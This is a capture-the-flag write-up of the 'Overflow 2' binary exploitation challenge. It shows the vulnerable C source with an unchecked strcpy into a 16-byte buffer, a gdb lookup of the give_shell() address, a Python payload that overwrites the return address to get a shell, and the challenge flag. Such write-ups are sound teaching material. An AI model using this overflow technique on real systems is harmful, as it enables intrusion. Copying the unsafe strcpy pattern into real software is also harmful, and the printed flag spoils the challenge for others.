### Solved by superkojiman

Overflow 2 is a 70 point binary exploitation challenge. 

> This problem has a buffer overflow vulnerability! Can you get a shell? You can solve this problem interactively here, and the source can be found here.

The code for the binary is provided:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* This never gets called! */
void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

void vuln(char *input){
    char buf[16];
    strcpy(buf, input);
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}
```

There's clearly an overflow in the vuln() function when a string larger than 16 bytes is copied to buf. All we need to do is overwrite the return address with the address of the give_shell() function to get our shell. Using the interactive interface, we see that we can overwrite EIP by sending 28 bytes of junk:

![](/images/2014/pico/overflow2/01.png)

Now we just need the address of the give_shell() function:

```text
pico1139@shell:/home/overflow2$ gdb ./overflow2 -q -batch -n -ex 'p give_shell'
$1 = {<text variable, no debug info>} 0x80484ad <give_shell>
```

We have everything we need to exploit it and get our shell:

```
pico1139@shell:/home/overflow2$ ./overflow2 `python -c 'print "A"*28 + "\xad\x84\x04\x08"'`
$ id
uid=11066(pico1139) gid=1003(overflow2) groups=1017(picogroup)
$ cat flag.txt
controlling_%eip_feels_great
```

The flag is **controlling_%eip_feels_great**
